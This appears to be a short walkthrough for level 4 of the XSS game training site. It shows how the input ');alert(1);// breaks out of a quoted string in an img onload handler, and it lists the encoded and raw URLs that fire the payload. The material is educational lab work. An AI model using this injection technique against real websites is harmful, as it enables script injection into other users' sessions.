@@ -1,0 +1,57 @@
+https://xss-game.appspot.com/level4
+
+
+<body id="level4">
+    <img src="/static/logos/level4.png" />
+    <br>
+    <img src="/static/loading.gif" onload="startTimer('{{ timer }}');" />
+    <br>
+    <div id="message">Your timer will execute in {{ timer }} seconds.</div>
+  </body>
+  
+  
+  This line is key:
+  
+<img src="/static/loading.gif" onload="startTimer('{{ timer }}');" />
+
+
+Let’s assume {{ timer }} is replaced with user input.
+
+So, if you input 5, it becomes:
+
+<img src="/static/loading.gif" onload="startTimer('5');" />
+
+✅ That’s valid JavaScript.
+
+
+But what if you input something that breaks out of the string?
+
+🔥 The XSS Attack Idea
+
+Let’s say we pass this:
+
+');alert(1);//
+(inside create timer form)
+
+It becomes:
+
+<img src="/static/loading.gif" onload="startTimer('');alert(1);//');" />
+or
+<img onload="startTimer('&#x27;);alert(1);//');">
+
+url becomes
+https://xss-game.appspot.com/level4/frame?timer=%27%29%3Balert(1)%3B%2F%2F
+or
+https://xss-game.appspot.com/level4/frame?timer=');alert(1);//
+
+
+
+🎯 JavaScript gets broken into:
+
+startTimer('');
+
+alert(1);
+
+//'); (commented out to avoid syntax error)
+
+✅ Payload executed!
